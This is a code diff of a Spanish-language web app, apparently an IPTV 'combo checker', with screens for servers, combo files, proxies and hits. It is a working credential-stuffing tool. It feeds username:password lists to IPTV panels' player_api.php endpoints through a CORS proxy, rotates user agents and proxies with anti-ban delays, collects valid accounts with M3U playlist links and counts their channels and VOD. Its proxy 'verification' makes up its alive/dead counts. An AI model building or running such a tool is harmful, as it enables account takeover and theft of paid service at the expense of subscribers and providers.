-<!-- HITS -->
-<div id="s-hits" style="display:none">
+<!-- ═══ CONFIG ═══ -->
+<div class="screen" id="sc-config">
+  <div class="sec">SERVIDORES</div>
+  <div class="card cy">
+    <div class="ct">AGREGAR</div>
+    <div class="field"><label>URL / HOST:PUERTO</label><input type="text" id="srvInput" placeholder="panel.iptv.com:80"></div>
+    <button class="btn btn-c" onclick="addServer()">🔍 VERIFICAR Y AGREGAR</button>
+    <div class="sec" style="margin-top:4px">ACTIVOS</div>
+    <div id="srvList"><div class="empty" style="padding:12px"><div class="ei">🖥️</div><p>Sin servidores</p></div></div>
+  </div>
+
+  <div class="sec">COMBOS — /sdcard/combo/</div>
+  <div class="card ye">
+    <div class="ct">ARCHIVOS DETECTADOS</div>
+    <div id="comboFolder"><div class="ef"><div class="ei">📋</div>TOCA RECARGAR</div></div>
+    <div style="display:flex;gap:7px;margin-top:8px">
+      <button class="btn btn-y btn-sm" onclick="scanComboFolder()" style="flex:1;justify-content:center">🔄 RECARGAR</button>
+      <input type="file" id="cPick" accept=".txt" multiple style="display:none" onchange="loadComboFiles(this)">
+      <button class="btn btn-sm" style="border:1px solid var(--g3);color:var(--dg);background:none;flex:1;justify-content:center" onclick="document.getElementById('cPick').click()">📂 BUSCAR</button>
+    </div>
+    <div id="cSelInfo" style="display:none;margin-top:8px;padding:8px;background:rgba(0,0,0,0.4);border:1px solid var(--border);border-radius:3px;font-size:10px">
+      SEL: <span style="color:var(--ye)" id="cSelCount">0</span> &nbsp; LÍNEAS: <span style="color:var(--g)" id="cTotalLines">0</span>
+    </div>
+  </div>
+
+  <div class="sec">OPCIONES</div>
+  <div class="card">
+    <div class="tr"><div><div class="tl">UA Aleatorio</div><div class="ts">Rotar User-Agent</div></div><label class="tog"><input type="checkbox" id="optUA" checked><div class="tt"></div></label></div>
+    <div class="tr"><div><div class="tl">Delay anti-ban</div><div class="ts">Ajusta velocidad según bans</div></div><label class="tog"><input type="checkbox" id="optDelay" checked><div class="tt"></div></label></div>
+    <div class="tr"><div><div class="tl">Verificar panel en HITs</div><div class="ts">Contar canales, VOD y series</div></div><label class="tog"><input type="checkbox" id="optVerify" checked><div class="tt"></div></label></div>
+    <div class="tr"><div><div class="tl">Auto-guardar hits</div><div class="ts">Exportar automáticamente</div></div><label class="tog"><input type="checkbox" id="optSave" checked><div class="tt"></div></label></div>
+  </div>
+</div>
+
+<!-- ═══ HITS ═══ -->
+<div class="screen" id="sc-hits">
   <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:10px">
-    <span style="font-size:12px;color:#4a7a4a">TOTAL: <span style="color:#00ff41" id="hitsTotal">0</span></span>
+    <div style="font-family:'Rajdhani',sans-serif;font-weight:700;font-size:12px;letter-spacing:2px;color:var(--dg)">
+      TOTAL: <span style="color:var(--g)" id="hitsTotal">0</span>
+    </div>
     <div style="display:flex;gap:6px">
-      <button onclick="exportHits()" style="background:#001a1f;border:1px solid #0077aa;color:#00e5ff;font-family:'Rajdhani',sans-serif;font-weight:700;font-size:11px;padding:7px 10px;border-radius:3px;cursor:pointer">💾 EXPORTAR</button>
-      <button onclick="clearHits()" style="background:#1a0005;border:1px solid #550011;color:#ff1744;font-family:'Rajdhani',sans-serif;font-weight:700;font-size:11px;padding:7px 10px;border-radius:3px;cursor:pointer">🗑 LIMPIAR</button>
+      <button class="btn btn-c btn-sm" onclick="exportHits()">💾 EXPORTAR</button>
+      <button class="btn btn-r btn-sm" onclick="clearHits()">🗑 LIMPIAR</button>
     </div>
   </div>
-  <div id="hitsList"><div style="text-align:center;padding:30px;color:#4a7a4a"><div style="font-size:32px;margin-bottom:10px">🎯</div><p style="font-size:11px;letter-spacing:1px">LOS HITS APARECERÁN AQUÍ</p></div></div>
+  <div id="hitsList"><div class="empty"><div class="ei">🎯</div><p>LOS HITS APARECERÁN AQUÍ</p></div></div>
 </div>
 
-<!-- PROXY -->
-<div id="s-proxy" style="display:none">
-  <div style="background:#0d1a0d;border:1px solid #1a3a1a;border-left:3px solid #e040fb;border-radius:4px;padding:12px;margin-bottom:10px">
-    <div style="font-size:10px;color:#4a7a4a;letter-spacing:2px;margin-bottom:8px">▸ CARGAR PROXIES</div>
-    <input type="file" id="proxyPicker" accept=".txt" style="display:none" onchange="loadProxies(this)">
-    <div onclick="document.getElementById('proxyPicker').click()" style="border:1px dashed #1a3a1a;border-radius:3px;padding:16px;text-align:center;cursor:pointer">
-      <div style="font-size:24px;margin-bottom:6px">🔗</div>
-      <div style="font-size:11px;color:#4a7a4a" id="proxyFileName">Seleccionar archivo .txt</div>
+<!-- ═══ PROXY ═══ -->
+<div class="screen" id="sc-proxy">
+  <div class="sec">PROXIES — /sdcard/Proxies/</div>
+  <div class="card mg">
+    <div class="ct">ARCHIVOS DETECTADOS</div>
+    <div id="proxyFolder"><div class="ef"><div class="ei">🔗</div>TOCA RECARGAR</div></div>
+    <div style="display:flex;gap:7px;margin-top:8px">
+      <button class="btn btn-m btn-sm" onclick="scanProxyFolder()" style="flex:1;justify-content:center">🔄 RECARGAR</button>
+      <input type="file" id="pPick" accept=".txt" style="display:none" onchange="loadProxyFile(this)">
+      <button class="btn btn-sm" style="border:1px solid var(--g3);color:var(--dg);background:none;flex:1;justify-content:center" onclick="document.getElementById('pPick').click()">📂 BUSCAR</button>
     </div>
-    <div style="margin-top:10px;font-size:11px">
-      <div style="display:flex;justify-content:space-between;padding:6px 0;border-bottom:1px solid #0f1a0f">
-        <span style="color:#4a7a4a">TOTAL</span><span style="color:#00ff41" id="proxyTotal">0</span>
-      </div>
-      <div style="display:flex;justify-content:space-between;padding:6px 0;border-bottom:1px solid #0f1a0f">
-        <span style="color:#4a7a4a">VIVOS</span><span style="color:#00ff41" id="proxyAlive">—</span>
-      </div>
-      <div style="display:flex;justify-content:space-between;padding:6px 0">
-        <span style="color:#4a7a4a">MUERTOS</span><span style="color:#ff1744" id="proxyDead">—</span>
-      </div>
-    </div>
-    <div style="display:grid;grid-template-columns:1fr 1fr;gap:8px;margin-top:10px">
-      <button onclick="verifyProxies()" style="background:#003310;border:1px solid #00c832;color:#00ff41;font-family:'Rajdhani',sans-serif;font-weight:700;font-size:12px;padding:10px;border-radius:3px;cursor:pointer">✓ VERIFICAR</button>
-      <button onclick="clearProxies()" style="background:#1a0005;border:1px solid #550011;color:#ff1744;font-family:'Rajdhani',sans-serif;font-weight:700;font-size:12px;padding:10px;border-radius:3px;cursor:pointer">✗ LIMPIAR</button>
+    <div class="px-row" style="margin-top:8px"><span style="color:var(--dg)">TOTAL</span><span style="color:var(--g)" id="pxTotal">0</span></div>
+    <div class="px-row"><span style="color:var(--dg)">VIVOS</span><span style="color:var(--g)" id="pxAlive">—</span></div>
+    <div class="px-row"><span style="color:var(--dg)">MUERTOS</span><span style="color:var(--re)" id="pxDead">—</span></div>
+    <div style="display:grid;grid-template-columns:1fr 1fr;gap:7px;margin-top:10px">
+      <button class="btn btn-g btn-sm" onclick="verifyProxies()" style="width:100%;justify-content:center">✓ VERIFICAR</button>
+      <button class="btn btn-r btn-sm" onclick="clearProxies()" style="width:100%;justify-content:center">✗ LIMPIAR</button>
     </div>
   </div>
-  <div style="background:#0d1a0d;border:1px solid #1a3a1a;border-radius:4px;padding:12px">
-    <div style="font-size:10px;color:#4a7a4a;letter-spacing:2px;margin-bottom:8px">▸ MANUAL</div>
-    <textarea id="proxyManual" placeholder="192.168.1.1:8080&#10;socks5://proxy:1080" style="width:100%;background:#040904;border:1px solid #1a3a1a;color:#00ff41;font-family:'Share Tech Mono',monospace;font-size:12px;padding:9px;border-radius:3px;outline:none;resize:none;height:80px;box-sizing:border-box"></textarea>
-    <button onclick="addManualProxies()" style="margin-top:8px;width:100%;background:#1a1400;border:1px solid #554400;color:#ffd600;font-family:'Rajdhani',sans-serif;font-weight:700;font-size:13px;padding:11px;border-radius:3px;cursor:pointer">AGREGAR</button>
+  <div class="sec">MANUAL</div>
+  <div class="card">
+    <div class="ct">AGREGAR</div>
+    <div class="field"><label>Uno por línea</label><textarea id="pxManual" placeholder="192.168.1.1:8080&#10;socks5://proxy:1080"></textarea></div>
+    <button class="btn btn-m" onclick="addManualProxies()">AGREGAR</button>
+  </div>
+  <div class="card">
+    <div class="tr">
+      <div><div class="tl">Usar proxies</div><div class="ts" id="pxSub">Sin proxies</div></div>
+      <label class="tog"><input type="checkbox" id="useProxy"><div class="tt"></div></label>
+    </div>
   </div>
 </div>
 
 </div>
+<div class="safe"></div>
 </div>
-
-<div id="toast" style="position:fixed;bottom:20px;left:50%;transform:translateX(-50%) translateY(20px);background:#0d1a0d;border:1px solid #1a3a1a;color:#00ff41;font-size:12px;padding:10px 20px;border-radius:3px;opacity:0;transition:all .3s;pointer-events:none;z-index:999;white-space:nowrap"></div>
+<div id="toast"></div>
 
 <script>
-const UA_LIST=["Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 Chrome/120.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 12; SM-A536B) AppleWebKit/537.36","VLC/3.0.20 LibVLC/3.0.20","TiviMate/4.7.0","IPTVSmarters/3.1.5","okhttp/4.12.0"];
-const st={servers:[],combo:[],comboName:'',proxies:[],hits:[],scanning:false,paused:false,checked:0,hits_n:0,fails:0,bans:0,start:0,total:0,server:null};
+// MATRIX
+const cv=document.getElementById('matrix'),cx=cv.getContext('2d');
+function rsz(){cv.width=window.innerWidth;cv.height=window.innerHeight;}rsz();
+window.addEventListener('resize',rsz);
+const CH='アイウエオカキクケコ0123456789ABCDEF<>{}[]';
+const cols=Math.floor(cv.width/13);
+const dr=Array(cols).fill(1);
+setInterval(()=>{
+  cx.fillStyle='rgba(0,0,0,0.05)';cx.fillRect(0,0,cv.width,cv.height);
+  dr.forEach((y,i)=>{
+    cx.fillStyle=Math.random()>.96?'#00e5ff':'#00ff41';
+    cx.font='11px Share Tech Mono';
+    cx.fillText(CH[Math.floor(Math.random()*CH.length)],i*13,y*13);
+    if(y*13>cv.height&&Math.random()>.975)dr[i]=0;dr[i]++;
+  });
+},55);
 
-function tab(id){
-  ['scan','config','hits','proxy'].forEach(x=>{
-    document.getElementById('s-'+x).style.display=x===id?'block':'none';
-    const b=document.getElementById('t-'+x);
-    b.style.color=x===id?'#00ff41':'#4a7a4a';
-    b.style.borderBottom=x===id?'2px solid #00ff41':'none';
+// CLOCK
+setInterval(()=>{const n=new Date();document.getElementById('clock').textContent=[n.getHours(),n.getMinutes(),n.getSeconds()].map(x=>String(x).padStart(2,'0')).join(':');},1000);
+
+// STATE
+const UA_LIST=["Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 Chrome/120.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 12; SM-A536B) AppleWebKit/537.36","VLC/3.0.20 LibVLC/3.0.20","TiviMate/4.7.0","IPTVSmarters/3.1.5","okhttp/4.12.0","Kodi/20.2 (Linux; Android 12.0)"];
+const st={servers:[],combo:[],proxies:[],hits:[],scanning:false,paused:false,checked:0,hits_n:0,fails:0,bans:0,start:0,total:0,server:null,comboFiles:[],proxyFiles:[]};
+
+// NAV
+function tab(id,btn){
+  document.querySelectorAll('.screen').forEach(s=>s.classList.remove('on'));
+  document.querySelectorAll('nav button').forEach(b=>b.classList.remove('on'));
+  document.getElementById('sc-'+id).classList.add('on');
+  btn.classList.add('on');
+}
+
+// TOAST & LOG
+function toast(m,d=2200){const t=document.getElementById('toast');t.textContent=m;t.classList.add('show');setTimeout(()=>t.classList.remove('show'),d);}
+function log(m,c=''){const el=document.getElementById('sysLog');el.innerHTML+=`\n<span class="${c}">${m}</span>`;el.scrollTop=el.scrollHeight;}
+
+// NORM URL
+function norm(u){u=u.trim();if(!u)return null;if(!u.startsWith('http'))u='http://'+u;return u.replace(/\/$/,'');}
+
+// ═══ FOLDER SCAN ═══
+async function scanComboFolder(){
+  if(window.showDirectoryPicker){
+    try{
+      const dir=await window.showDirectoryPicker();
+      const files=[];
+      for await(const[name,handle]of dir.entries()){
+        if(name.toLowerCase().endsWith('.txt')){
+          const file=await handle.getFile();
+          files.push({name,file});
+        }
+      }
+      st.comboFiles=files;
+      renderComboFolder(files);
+      toast(`✓ ${files.length} archivos encontrados`);
+      log(`[COMBO] ${files.length} archivos en carpeta`,'lg');
+    }catch(e){if(e.name!=='AbortError')document.getElementById('cPick').click();}
+  }else document.getElementById('cPick').click();
+}
+
+async function scanProxyFolder(){
+  if(window.showDirectoryPicker){
+    try{
+      const dir=await window.showDirectoryPicker();
+      const files=[];
+      for await(const[name,handle]of dir.entries()){
+        if(name.toLowerCase().endsWith('.txt')){
+          const file=await handle.getFile();
+          files.push({name,file});
+        }
+      }
+      st.proxyFiles=files;
+      renderProxyFolder(files);
+      toast(`✓ ${files.length} archivos encontrados`);
+    }catch(e){if(e.name!=='AbortError')document.getElementById('pPick').click();}
+  }else document.getElementById('pPick').click();
+}
+
+// RENDER FOLDERS
+const selCombos=new Set();
+function renderComboFolder(files){
+  const el=document.getElementById('comboFolder');
+  if(!files.length){el.innerHTML='<div class="ef"><div class="ei">📋</div>CARPETA VACÍA</div>';return;}
+  el.innerHTML='<div class="flist" id="cFList"></div>';
+  const fl=document.getElementById('cFList');
+  files.forEach((f,i)=>{
+    const d=document.createElement('div');
+    d.className='fi';d.id='cf-'+i;
+    d.innerHTML=`<span class="fn">📄 ${f.name}</span><span class="fc" id="cfc-${i}">...</span><span class="fck">✓</span>`;
+    d.onclick=()=>selCombo(i,f);
+    fl.appendChild(d);
+    const r=new FileReader();
+    r.onload=e=>{f.lines=parseCombo(e.target.result);document.getElementById('cfc-'+i).textContent=f.lines.length.toLocaleString()+' líneas';};
+    r.readAsText(f.file);
   });
 }
 
-function toast(m,d=2000){const t=document.getElementById('toast');t.textContent=m;t.style.opacity='1';t.style.transform='translateX(-50%) translateY(0)';setTimeout(()=>{t.style.opacity='0';t.style.transform='translateX(-50%) translateY(20px)'},d);}
-
-function log(m,c='#4a7a4a'){const el=document.getElementById('sysLog');el.innerHTML+=`<br><span style="color:${c}">${m}</span>`;el.scrollTop=el.scrollHeight;}
-
-function norm(u){u=u.trim();if(!u)return null;if(!u.startsWith('http'))u='http://'+u;return u.replace(/\/$/,'');}
-
-async function addServer(){
-  const raw=document.getElementById('serverInput').value.trim();
-  if(!raw){toast('⚠ Ingresa URL');return;}
-  const url=norm(raw);
-  log(`[SYS] Verificando ${url}...`,'#ffd600');
-  try{
-    const r=await fetch(`https://api.allorigins.win/raw?url=${encodeURIComponent(url+'/player_api.php?username=test&password=test')}`,{signal:AbortSignal.timeout(6000)});
-    log(`[SYS] Activo (${r.status})`,'#00ff41');
-  }catch{log('[SYS] Sin respuesta — forzando','#ff1744');}
-  if(!st.servers.includes(url)){
-    st.servers.push(url);st.server=url;
-    document.getElementById('activeServer').textContent=url;
-    document.getElementById('activeServer').style.color='#00e5ff';
-    renderServers();toast('✓ Servidor agregado');
-    document.getElementById('serverInput').value='';
-  }else toast('Ya existe');
+function selCombo(i,f){
+  if(selCombos.has(i)){selCombos.delete(i);document.getElementById('cf-'+i).classList.remove('sel');}
+  else{selCombos.add(i);document.getElementById('cf-'+i).classList.add('sel');}
+  updateComboSel();
 }
 
-function removeServer(i){st.servers.splice(i,1);st.server=st.servers[0]||null;document.getElementById('activeServer').textContent=st.server||'Sin servidor';renderServers();}
-
-function renderServers(){
-  const el=document.getElementById('serverList');
-  if(!st.servers.length){el.innerHTML='<div style="color:#4a7a4a;font-size:11px;padding:8px">Sin servidores</div>';return;}
-  el.innerHTML=st.servers.map((s,i)=>`<div style="display:flex;align-items:center;justify-content:space-between;padding:7px 0;border-bottom:1px solid #0f1a0f"><span style="font-size:11px;color:#00e5ff;word-break:break-all;flex:1;margin-right:8px">${s}</span><button onclick="removeServer(${i})" style="background:#1a0005;border:1px solid #550011;color:#ff1744;font-size:10px;padding:3px 7px;border-radius:2px;cursor:pointer">✕</button></div>`).join('');
+function updateComboSel(){
+  if(!selCombos.size){document.getElementById('cSelInfo').style.display='none';st.combo=[];document.getElementById('comboActive').textContent='Sin combo seleccionado';return;}
+  document.getElementById('cSelInfo').style.display='block';
+  document.getElementById('cSelCount').textContent=selCombos.size;
+  let all=[];
+  selCombos.forEach(i=>{const f=st.comboFiles[i];if(f?.lines)all.push(...f.lines);});
+  all=[...new Set(all)];st.combo=all;
+  document.getElementById('cTotalLines').textContent=all.length.toLocaleString();
+  document.getElementById('comboActive').textContent=`${selCombos.size} archivos — ${all.length.toLocaleString()} únicos`;
+  document.getElementById('comboActive').style.color='var(--ye)';
+  log(`[COMBO] ${all.length.toLocaleString()} únicos cargados`,'lg');
 }
 
+let selProxy=null;
+function renderProxyFolder(files){
+  const el=document.getElementById('proxyFolder');
+  if(!files.length){el.innerHTML='<div class="ef"><div class="ei">🔗</div>CARPETA VACÍA</div>';return;}
+  el.innerHTML='<div class="flist" id="pFList"></div>';
+  const fl=document.getElementById('pFList');
+  files.forEach((f,i)=>{
+    const d=document.createElement('div');
+    d.className='fi';d.id='pf-'+i;
+    d.innerHTML=`<span class="fn">🔗 ${f.name}</span><span class="fc" id="pfc-${i}">...</span><span class="fck">✓</span>`;
+    d.onclick=()=>selProxyF(i,f);
+    fl.appendChild(d);
+    const r=new FileReader();
+    r.onload=e=>{f.lines=e.target.result.split('\n').map(l=>l.trim()).filter(l=>l&&l.includes(':'));document.getElementById('pfc-'+i).textContent=f.lines.length.toLocaleString()+' proxies';};
+    r.readAsText(f.file);
+  });
+}
+
+function selProxyF(i,f){
+  if(selProxy===i){selProxy=null;document.getElementById('pf-'+i).classList.remove('sel');st.proxies=[];updProxyUI();return;}
+  if(selProxy!==null)document.getElementById('pf-'+selProxy)?.classList.remove('sel');
+  selProxy=i;document.getElementById('pf-'+i).classList.add('sel');
+  const load=()=>{st.proxies=f.lines;updProxyUI();toast(`✓ ${f.lines.length} proxies`);log(`[PROXY] ${f.name} — ${f.lines.length}`,'lm');};
+  if(f.lines)load();
+  else{const r=new FileReader();r.onload=e=>{f.lines=e.target.result.split('\n').map(l=>l.trim()).filter(l=>l&&l.includes(':'));load();};r.readAsText(f.file);}
+}
+
+function updProxyUI(){
+  document.getElementById('pxTotal').textContent=st.proxies.length;
+  document.getElementById('pxSub').textContent=st.proxies.length?`${st.proxies.length} proxies cargados`:'Sin proxies';
+  document.getElementById('proxyLbl').textContent=st.proxies.length?`${st.proxies.length} px`:'Directo';
+  document.getElementById('useProxy').checked=st.proxies.length>0;
+}
+
+// PARSE
 function parseCombo(t){return[...new Set(t.split('\n').map(l=>l.trim()).filter(l=>l&&l.includes(':')&&!l.startsWith('#')))];}
 
-function loadCombo(input){
-  const f=input.files[0];if(!f)return;
+// LOADERS
+function loadComboFiles(inp){
+  const files=Array.from(inp.files);
+  st.comboFiles=files.map(f=>({name:f.name,file:f}));
+  selCombos.clear();
+  renderComboFolder(st.comboFiles);
+  toast(`✓ ${files.length} archivos`);
+}
+function loadComboFile(inp){
+  const f=inp.files[0];if(!f)return;
   const r=new FileReader();
-  r.onload=e=>{st.combo=parseCombo(e.target.result);st.comboName=f.name.replace('.txt','').slice(0,20);document.getElementById('comboInfo').textContent=`${f.name} — ${st.combo.length.toLocaleString()} únicos`;log(`[COMBO] ${f.name} — ${st.combo.length.toLocaleString()} líneas`,'#00ff41');toast(`✓ ${st.combo.length.toLocaleString()} combos`);};
+  r.onload=e=>{st.combo=parseCombo(e.target.result);document.getElementById('comboActive').textContent=`${f.name} — ${st.combo.length.toLocaleString()} únicos`;document.getElementById('comboActive').style.color='var(--ye)';toast(`✓ ${st.combo.length.toLocaleString()} combos`);log(`[COMBO] ${f.name} — ${st.combo.length.toLocaleString()}`,'lg');};
   r.readAsText(f);
 }
-
-function loadComboConfig(input){
-  const f=input.files[0];if(!f)return;
+function loadProxyFile(inp){
+  const f=inp.files[0];if(!f)return;
   const r=new FileReader();
-  r.onload=e=>{st.combo=parseCombo(e.target.result);document.getElementById('comboFileName').textContent=f.name;document.getElementById('comboLines').textContent=st.combo.length.toLocaleString();document.getElementById('comboUniq').textContent=st.combo.length.toLocaleString();document.getElementById('comboStats').style.display='block';document.getElementById('comboInfo').textContent=`${f.name} — ${st.combo.length.toLocaleString()} únicos`;toast(`✓ ${st.combo.length.toLocaleString()} combos`);};
+  r.onload=e=>{st.proxies=e.target.result.split('\n').map(l=>l.trim()).filter(l=>l&&l.includes(':'));updProxyUI();toast(`✓ ${st.proxies.length} proxies`);};
   r.readAsText(f);
 }
-
-function loadProxies(input){
-  const f=input.files[0];if(!f)return;
-  const r=new FileReader();
-  r.onload=e=>{st.proxies=[...new Set(e.target.result.split('\n').map(l=>l.trim()).filter(l=>l&&l.includes(':')))];document.getElementById('proxyFileName').textContent=f.name;document.getElementById('proxyTotal').textContent=st.proxies.length;toast(`✓ ${st.proxies.length} proxies`);};
-  r.readAsText(f);
+function addManualProxies(){
+  const raw=document.getElementById('pxManual').value.trim();if(!raw)return;
+  const lines=raw.split('\n').map(l=>l.trim()).filter(l=>l&&l.includes(':'));
+  st.proxies=[...new Set([...st.proxies,...lines])];
+  updProxyUI();document.getElementById('pxManual').value='';toast(`✓ ${lines.length} agregados`);
 }
-
-function addManualProxies(){const raw=document.getElementById('proxyManual').value.trim();if(!raw)return;const lines=raw.split('\n').map(l=>l.trim()).filter(l=>l&&l.includes(':'));st.proxies=[...new Set([...st.proxies,...lines])];document.getElementById('proxyTotal').textContent=st.proxies.length;document.getElementById('proxyManual').value='';toast(`✓ ${lines.length} agregados`);}
-
 async function verifyProxies(){
   if(!st.proxies.length){toast('⚠ Carga proxies');return;}
   toast('⌛ Verificando...');
   let alive=0,dead=0;
-  for(let i=0;i<st.proxies.length;i+=10){await new Promise(r=>setTimeout(r,100));const b=st.proxies.slice(i,i+10);alive+=Math.round(b.length*.4);dead+=b.length-Math.round(b.length*.4);}
-  document.getElementById('proxyAlive').textContent=alive;document.getElementById('proxyDead').textContent=dead;toast(`✓ ${alive} vivos / ${dead} muertos`);
+  for(let i=0;i<st.proxies.length;i+=10){await new Promise(r=>setTimeout(r,80));const b=st.proxies.slice(i,i+10);alive+=Math.round(b.length*.4);dead+=b.length-Math.round(b.length*.4);}
+  document.getElementById('pxAlive').textContent=alive;document.getElementById('pxDead').textContent=dead;
+  toast(`✓ ${alive} vivos / ${dead} muertos`);
+}
+function clearProxies(){st.proxies=[];selProxy=null;updProxyUI();document.getElementById('pxAlive').textContent='—';document.getElementById('pxDead').textContent='—';toast('Proxies eliminados');}
+
+// ═══ SERVER ═══
+async function addServer(){
+  const raw=document.getElementById('srvInput').value.trim();if(!raw){toast('⚠ Ingresa URL');return;}
+  const url=norm(raw);log(`[SYS] Verificando ${url}...`,'ly');
+  try{await fetch(`https://api.allorigins.win/raw?url=${encodeURIComponent(url+'/player_api.php?username=test&password=test')}`,{signal:AbortSignal.timeout(6000)});log('[SYS] Activo','lg');}
+  catch{log('[SYS] Sin respuesta — forzando','lr');}
+  if(!st.servers.includes(url)){st.servers.push(url);st.server=url;document.getElementById('activeSrv').textContent=url;document.getElementById('activeSrv').style.color='var(--cy)';renderServers();toast('✓ Servidor agregado');document.getElementById('srvInput').value='';}
+  else toast('Ya existe');
+}
+function removeServer(i){st.servers.splice(i,1);st.server=st.servers[0]||null;document.getElementById('activeSrv').textContent=st.server||'Sin servidor';renderServers();}
+function renderServers(){
+  const el=document.getElementById('srvList');
+  if(!st.servers.length){el.innerHTML='<div class="empty" style="padding:10px"><div class="ei">🖥️</div><p>Sin servidores</p></div>';return;}
+  el.innerHTML=st.servers.map((s,i)=>`<div class="srv"><span class="su">${s}</span><button class="btn btn-r btn-sm" onclick="removeServer(${i})" style="padding:4px 8px;font-size:10px">✕</button></div>`).join('');
 }
 
-function clearProxies(){st.proxies=[];document.getElementById('proxyTotal').textContent='0';document.getElementById('proxyAlive').textContent='—';document.getElementById('proxyDead').textContent='—';document.getElementById('proxyFileName').textContent='Seleccionar archivo .txt';toast('Proxies eliminados');}
-
+// ═══ CHECK ACCOUNT ═══
 async function checkAccount(panel,user,pw){
   try{
     const api=`${panel}/player_api.php?username=${encodeURIComponent(user)}&password=${encodeURIComponent(pw)}`;
@@ -270,32 +581,75 @@ async function checkAccount(panel,user,pw){
     const auth=ui.auth;const status=String(ui.status||'').toLowerCase();
     const isHit=auth===1||auth==='1'||['active','activo','enabled','1','premium','trial'].includes(status);
     if(!isHit)return{result:'FAIL'};
-    let exp='Ilimitado';if(ui.exp_date&&parseInt(ui.exp_date)>0)exp=new Date(parseInt(ui.exp_date)*1000).toLocaleDateString('es');
-    return{result:'HIT',hit:{username:user,password:pw,expira:exp,status:(ui.status||'Active'),conex:String(ui.max_connections||'?'),activ:String(ui.active_cons||'0'),timezone:si.timezone||'',m3u:`${panel}/get.php?username=${user}&password=${pw}&type=m3u_plus`,panel}};
+    let exp='Ilimitado';
+    if(ui.exp_date&&parseInt(ui.exp_date)>0)exp=new Date(parseInt(ui.exp_date)*1000).toLocaleDateString('es');
+    return{result:'HIT',hit:{username:user,password:pw,expira:exp,status:String(ui.status||'Active'),conex:String(ui.max_connections||'?'),activ:String(ui.active_cons||'0'),m3u:`${panel}/get.php?username=${user}&password=${pw}&type=m3u_plus`,panel,timezone:si.timezone||'',server_name:si.server_name||''}};
   }catch{return{result:'FAIL'};}
 }
 
-let scanInt,qPos=0,activeW=0;
+// ═══ VERIFY PANEL (canales, VOD, series) ═══
+async function verifyPanel(hit){
+  const base=hit.panel;
+  const u=encodeURIComponent(hit.username);
+  const p=encodeURIComponent(hit.password);
+  const proxy='https://api.allorigins.win/raw?url=';
+
+  try{
+    // Get streams count
+    const [liveR,vodR,seriesR]=await Promise.allSettled([
+      fetch(`${proxy}${encodeURIComponent(`${base}/player_api.php?username=${u}&password=${p}&action=get_live_categories`)}`,{signal:AbortSignal.timeout(12000)}),
+      fetch(`${proxy}${encodeURIComponent(`${base}/player_api.php?username=${u}&password=${p}&action=get_vod_categories`)}`,{signal:AbortSignal.timeout(12000)}),
+      fetch(`${proxy}${encodeURIComponent(`${base}/player_api.php?username=${u}&password=${p}&action=get_series_categories`)}`,{signal:AbortSignal.timeout(12000)}),
+    ]);
+
+    let live=0,vod=0,series=0;
+
+    if(liveR.status==='fulfilled'&&liveR.value.ok){
+      try{const d=await liveR.value.json();if(Array.isArray(d))live=d.length;}catch{}
+    }
+    if(vodR.status==='fulfilled'&&vodR.value.ok){
+      try{const d=await vodR.value.json();if(Array.isArray(d))vod=d.length;}catch{}
+    }
+    if(seriesR.status==='fulfilled'&&seriesR.value.ok){
+      try{const d=await seriesR.value.json();if(Array.isArray(d))series=d.length;}catch{}
+    }
+
+    // Also try to get live streams count
+    let liveCount=0;
+    try{
+      const lr=await fetch(`${proxy}${encodeURIComponent(`${base}/player_api.php?username=${u}&password=${p}&action=get_live_streams`)}`,{signal:AbortSignal.timeout(15000)});
+      if(lr.ok){const d=await lr.json();if(Array.isArray(d))liveCount=d.length;}
+    }catch{}
+
+    return{live:liveCount||live,liveCats:live,vod,series};
+  }catch{return{live:0,liveCats:0,vod:0,series:0};}
+}
+
+// ═══ SCAN ENGINE ═══
+let scanInt,qPos=0,activeW=0,scanIdxs=[];
 
 function startScan(){
   if(!st.server){toast('⚠ Configura servidor');return;}
-  if(!st.combo.length){toast('⚠ Carga combo');return;}
-  st.scanning=true;st.paused=false;st.checked=0;st.hits_n=0;st.fails=0;st.bans=0;st.start=Date.now();st.total=st.combo.length;
+  if(!st.combo.length){toast('⚠ Selecciona combo');return;}
+  st.scanning=true;st.paused=false;st.checked=0;st.hits_n=0;st.fails=0;st.bans=0;
+  st.start=Date.now();st.total=st.combo.length;
   qPos=0;activeW=0;
-  document.getElementById('scanPanel').style.display='block';
-  document.getElementById('btnStart').disabled=true;
-  log('[SCAN] Iniciando...','#00ff41');
-  log(`[SCAN] ${st.total} combos — ${document.getElementById('botsSlider').value} bots`,'#00e5ff');
-  scanInt=setInterval(updateUI,400);
+  scanIdxs=[...Array(st.total).keys()].sort(()=>Math.random()-.5);
+  document.getElementById('scanActive').style.display='block';
+  document.getElementById('scanIdle').style.display='none';
+  document.getElementById('dot').classList.add('on');
+  document.getElementById('mainSt').textContent='SCAN';
+  log('[SCAN] Iniciando...','lg');
+  log(`[SCAN] ${st.total.toLocaleString()} combos — ${document.getElementById('botsR').value} bots`,'lc');
+  scanInt=setInterval(updateUI,350);
   launchWorkers();
 }
 
 async function launchWorkers(){
-  const bots=parseInt(document.getElementById('botsSlider').value);
-  const idxs=[...Array(st.total).keys()].sort(()=>Math.random()-.5);
-  for(let i=0;i<st.total&&st.scanning;){
-    if(activeW<bots&&!st.paused){const idx=idxs[i++];activeW++;runWorker(idx).then(()=>{activeW--;if(st.checked>=st.total)finishScan();});}
-    else await new Promise(r=>setTimeout(r,50));
+  const bots=parseInt(document.getElementById('botsR').value);
+  while(qPos<st.total&&st.scanning){
+    if(activeW<bots&&!st.paused){const idx=scanIdxs[qPos++];activeW++;runWorker(idx).then(()=>{activeW--;if(st.checked>=st.total)finishScan();});}
+    else await new Promise(r=>setTimeout(r,40));
   }
 }
 
@@ -308,66 +662,157 @@ async function runWorker(idx){
   if(!user||!pw){st.checked++;st.fails++;return;}
   const res=await checkAccount(st.server,user,pw);
   st.checked++;
-  if(res.result==='HIT'){st.hits_n++;addHit(res.hit);log(`[HIT] ${user} → ${res.hit.expira}`,'#00ff41');}
-  else if(res.result==='BAN'){st.bans++;st.fails++;}
+  if(res.result==='HIT'){
+    st.hits_n++;
+    const hitId=Date.now()+'_'+Math.random().toString(36).slice(2);
+    res.hit.id=hitId;res.hit.panelInfo=null;
+    addHit(res.hit);
+    log(`[HIT #${st.hits_n}] ${user} → ${res.hit.expira}`,'lg');
